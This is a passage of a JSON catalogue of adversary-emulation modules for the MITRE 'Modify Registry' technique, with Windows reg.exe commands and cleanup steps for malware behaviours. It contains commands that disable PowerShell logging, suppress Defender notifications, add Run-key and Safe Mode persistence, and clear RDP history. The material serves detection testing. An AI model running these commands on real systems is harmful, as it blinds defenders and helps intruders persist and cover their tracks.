        "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoLogOff /t REG_DWORD /d 1 /f\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v StartMenuLogOff /t REG_DWORD /d 1 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoLogOff /f >nul 2>&1\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v StartMenuLogOff /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "e246578a-c24d-46a7-9237-0213ff86fb0c",
      "module_name": "Disable Windows LogOff Button"
    },
    {
      "index": 716,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows change password feature.\nSee how ransomware abuses this technique- https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/ransom_heartbleed.thdobah\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableChangePassword /t REG_DWORD /d 1 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableChangePassword /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "d4a6da40-618f-454d-9a9e-26af552aaeb0",
      "module_name": "Disable Windows Change Password Feature"
    },
    {
      "index": 717,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows Lock workstation feature.\nSee how ransomware abuses this technique- https://www.bleepingcomputer.com/news/security/in-dev-ransomware-forces-you-do-to-survey-before-unlocking-computer/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableLockWorkstation /t REG_DWORD /d 1 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableLockWorkstation /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "3dacb0d2-46ee-4c27-ac1b-f9886bf91a56",
      "module_name": "Disable Windows Lock Workstation Feature"
    },
    {
      "index": 718,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to hide all icons on Desktop Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoDesktop /t REG_DWORD /d 1 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoDesktop /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "93386d41-525c-4a1b-8235-134a628dee17",
      "module_name": "Activate Windows NoDesktop Group Policy Feature"
    },
    {
      "index": 719,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Remove Run menu from Start Menu Group Policy.\nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoRun /t REG_DWORD /d 1 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoRun /f \n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "d49ff3cc-8168-4123-b5b3-f057d9abbd55",
      "module_name": "Activate Windows NoRun Group Policy Feature"
    },
    {
      "index": 720,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Remove Search menu from Start Menu Group Policy.\nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFind /t REG_DWORD /d 1 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFind /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "ffbb407e-7f1d-4c95-b22e-548169db1fbd",
      "module_name": "Activate Windows NoFind Group Policy Feature"
    },
    {
      "index": 721,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable Control Panel Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoControlPanel /t REG_DWORD /d 1 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoControlPanel /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "a450e469-ba54-4de1-9deb-9023a6111690",
      "module_name": "Activate Windows NoControlPanel Group Policy Feature"
    },
    {
      "index": 722,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Remove File menu from Windows Explorer Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFileMenu /t REG_DWORD /d 1 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFileMenu /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "5e27bdb4-7fd9-455d-a2b5-4b4b22c9dea4",
      "module_name": "Activate Windows NoFileMenu Group Policy Feature"
    },
    {
      "index": 723,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable and remove the Shut Down command Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoClose /t REG_DWORD /d 1 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoClose /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "12f50e15-dbc6-478b-a801-a746e8ba1723",
      "module_name": "Activate Windows NoClose Group Policy Feature"
    },
    {
      "index": 724,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable changes to Taskbar and Start Menu Settings Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoSetTaskbar /t REG_DWORD /d 1 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoSetTaskbar /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "d29b7faf-7355-4036-9ed3-719bd17951ed",
      "module_name": "Activate Windows NoSetTaskbar Group Policy Feature"
    },
    {
      "index": 725,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable context menu for taskbar Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoTrayContextMenu /t REG_DWORD /d 1 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoTrayContextMenu /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "4d72d4b1-fa7b-4374-b423-0fe326da49d2",
      "module_name": "Activate Windows NoTrayContextMenu Group Policy Feature"
    },
    {
      "index": 726,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to hide Properties from \"My Documents icon\" Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoPropertiesMyDocuments /t REG_DWORD /d 1 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoPropertiesMyDocuments /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "20fc9daa-bd48-4325-9aff-81b967a84b1d",
      "module_name": "Activate Windows NoPropertiesMyDocuments Group Policy Feature"
    },
    {
      "index": 727,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Hide Clock Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideClock /t REG_DWORD /d 1 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideClock /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "8023db1e-ad06-4966-934b-b6a0ae52689e",
      "module_name": "Hide Windows Clock Group Policy Feature"
    },
    {
      "index": 728,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to remove security and maintenance icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAHealth /t REG_DWORD /d 1 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAHealth /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "a4637291-40b1-4a96-8c82-b28f1d73e54e",
      "module_name": "Windows HideSCAHealth Group Policy Feature"
    },
    {
      "index": 729,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to remove the networking icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCANetwork /t REG_DWORD /d 1 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCANetwork /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "3e757ce7-eca0-411a-9583-1c33b8508d52",
      "module_name": "Windows HideSCANetwork Group Policy Feature"
    },
    {
      "index": 730,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to remove the battery icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAPower /t REG_DWORD /d 1 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAPower /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "8d85a5d8-702f-436f-bc78-fcd9119496fc",
      "module_name": "Windows HideSCAPower Group Policy Feature"
    },
    {
      "index": 731,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to remove the volume icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect..\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAVolume /t REG_DWORD /d 1 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAVolume /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "7f037590-b4c6-4f13-b3cc-e424c5ab8ade",
      "module_name": "Windows HideSCAVolume Group Policy Feature"
    },
    {
      "index": 732,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to show compress color and show tips feature. \nSee how hermeticwiper uses this technique - https://www.splunk.com/en_us/blog/security/detecting-hermeticwiper.html\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg  add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowInfoTip /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowCompColor /t REG_DWORD /d 0 /f\n",
        "elevation_required": false,
        "cleanup_command": "reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowInfoTip /f >nul 2>&1\nreg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowCompColor /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "795d3248-0394-4d4d-8e86-4e8df2a2693f",
      "module_name": "Windows Modify Show Compress Color And Info Tip Registry"
    },
    {
      "index": 733,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable Powershell Module Logging, Script Block Logging, Transcription and Script Execution\nsee https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.PowerShell::EnableModuleLogging\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging /v EnableModuleLogging /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription /v EnableTranscripting /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell /v EnableScripts /t REG_DWORD /d 0 /f\nreg delete HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell /v EnableScripts /f >nul 2>&1\n",
        "elevation_required": true,
        "cleanup_command": "reg delete HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging /v EnableModuleLogging /f >nul 2>&1\nreg delete HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging /v EnableScriptBlockLogging /f >nul 2>&1\nreg delete HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription /v EnableTranscripting /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "95b25212-91a7-42ff-9613-124aca6845a8",
      "module_name": "Windows Powershell Logging Disabled"
    },
    {
      "index": 734,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Modify the registry to allow a driver, service, to persist in Safe Mode.\nsee https://redcanary.com/blog/tracking-driver-inventory-to-expose-rootkits/ and https://blog.didierstevens.com/2007/03/26/playing-with-safe-mode/ for further details.\nAdding a subkey to Minimal with the name of your service and a default value set to Service, makes that your service will be started when you boot into Safe Mode without networking. The same applies for the Network subkey.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\RAGLOXSafeMode\" /VE /T REG_SZ /F /D \"Service\"\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\RAGLOXSafeMode\" /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "1dd59fb3-1cb3-4828-805d-cf80b4c3bbb5",
      "module_name": "Windows Add Registry Value to Load Service in Safe Mode without Network"
    },
    {
      "index": 735,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Modify the registry to allow a driver, service, to persist in Safe Mode with networking.\nsee https://redcanary.com/blog/tracking-driver-inventory-to-expose-rootkits/ and https://blog.didierstevens.com/2007/03/26/playing-with-safe-mode/ for further details.\nAdding a subkey to Netowrk with the name of your service and a default value set to Service, makes that your service will be started when you boot into Safe Mode with networking.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\RAGLOXSafeMode\" /VE /T REG_SZ /F /D \"Service\"\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\RAGLOXSafeMode\" /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "c173c948-65e5-499c-afbe-433722ed5bd4",
      "module_name": "Windows Add Registry Value to Load Service in Safe Mode with Network"
    },
    {
      "index": 736,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows toast notification.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PushNotifications /v ToastEnabled /t REG_DWORD /d 0 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PushNotifications /v ToastEnabled /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "003f466a-6010-4b15-803a-cbb478a314d7",
      "module_name": "Disable Windows Toast Notifications"
    },
    {
      "index": 737,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows security center notification.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\ImmersiveShell /v UseActionCenterExperience /t REG_DWORD /d 0 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\ImmersiveShell /v UseActionCenterExperience /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "45914594-8df6-4ea9-b3cc-7eb9321a807e",
      "module_name": "Disable Windows Security Center Notifications"
    },
    {
      "index": 738,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to suppress the windows defender notification.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration\" /v Notification_Suppress /t REG_DWORD /d 1 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration\" /v Notification_Suppress /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "c30dada3-7777-4590-b970-dc890b8cf113",
      "module_name": "Suppress Win Defender Notifications"
    },
    {
      "index": 739,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to allow rdp remote assistance feature. This feature allow specific\nuser to rdp connect on the targeted machine.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fAllowToGetHelp /t REG_DWORD /d 1 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fAllowToGetHelp /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "86677d0e-0b5e-4a2b-b302-454175f9aa9e",
      "module_name": "Allow RDP Remote Assistance Feature"
    },
    {
      "index": 740,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "NetWire continues to create its home key (HKCU\\SOFTWARE\\NetWire) as well as adding it into the auto-run group in the victims registry.\nSee how NetWire malware - https://app.any.run/tasks/41ecdbde-4997-4301-a350-0270448b4c8f/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v NetWire /t REG_SZ  /d \"C:\\Users\\admin\\AppData\\Roaming\\Install\\Host.exe\" /f\nreg add HKCU\\SOFTWARE\\NetWire /v HostId /t REG_SZ /d HostId-kai6Ci /f\nreg add HKCU\\SOFTWARE\\NetWire /v \"Install Date\" /t REG_SZ /d \"2021-08-30 07:17:27\" /f\n",
        "elevation_required": false,
        "cleanup_command": "reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v NetWire /f >nul 2>&1\nreg delete HKCU\\SOFTWARE\\NetWire /va /f >nul 2>&1\nreg delete HKCU\\SOFTWARE\\NetWire /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "65704cd4-6e36-4b90-b6c1-dc29a82c8e56",
      "module_name": "NetWire RAT Registry Key Creation"
    },
    {
      "index": 741,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Ursnif downloads additional modules from the C&C server and saves these in the registry folder HKEY_CURRENT_USER\\Software\\AppDataLow\\Software\\Microsoft\\\nMore information - https://blog.trendmicro.com/trendlabs-security-intelligence/phishing-campaign-uses-hijacked-emails-to-deliver-ursnif-by-replying-to-ongoing-threads/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add HKCU\\Software\\AppDataLow\\Software\\Microsoft\\3A861D62-51E0-15700F2219A4 /v comsxRes /t REG_BINARY  /d 72656463616e617279 /f\n",
        "elevation_required": false,
        "cleanup_command": "reg delete HKCU\\Software\\AppDataLow\\Software\\Microsoft\\3A861D62-51E0-15700F2219A4 /va /f >nul 2>&1\nreg delete HKCU\\Software\\AppDataLow\\Software\\Microsoft\\3A861D62-51E0-15700F2219A4 /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "c375558d-7c25-45e9-bd64-7b23a97c1db0",
      "module_name": "Ursnif Malware Registry Key Creation"
    },
    {
      "index": 742,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "The built-in Windows Remote Desktop Connection (RDP) client (mstsc.exe) saves the remote computer name (or IP address) and the username that is used to login after each successful connection to the remote computer\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" /va /f\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\" /f\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Must have the \"MR9\" Remote Desktop Connection history Key \n",
          "check_command": "if ((Get-ItemProperty -Path \"HKCU:\\SOFTWARE\\Microsoft\\Terminal Server Client\\Default\\\").MR9) {exit 0} else {exit 1}\n",
          "install_command": "New-Item -path \"HKCU:\\SOFTWARE\\Microsoft\\\" -name \"Terminal Server Client\"  -ErrorAction Ignore\nNew-Item -path \"HKCU:\\SOFTWARE\\Microsoft\\Terminal Server Client\\\" -name \"Default\" -ErrorAction Ignore\nNew-Itemproperty -path \"HKCU:\\SOFTWARE\\Microsoft\\Terminal Server Client\\Default\" -name \"MR9\" -value \"127.0.0.1\"  -PropertyType \"String\" -ErrorAction Ignore\nNew-Item -path \"HKCU:\\SOFTWARE\\Microsoft\\Terminal Server Client\\\" -name \"Servers\" -ErrorAction Ignore\nNew-Item -path \"HKCU:\\SOFTWARE\\Microsoft\\Terminal Server Client\\Servers\" -name \"Redcanary\" -ErrorAction Ignore\n"
        }
      ],
      "rx_module_id": "3448824b-3c35-4a9e-a8f5-f887f68bea21",
      "module_name": "Terminal Server Client Connection History Cleared"
    },
    {
      "index": 743,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
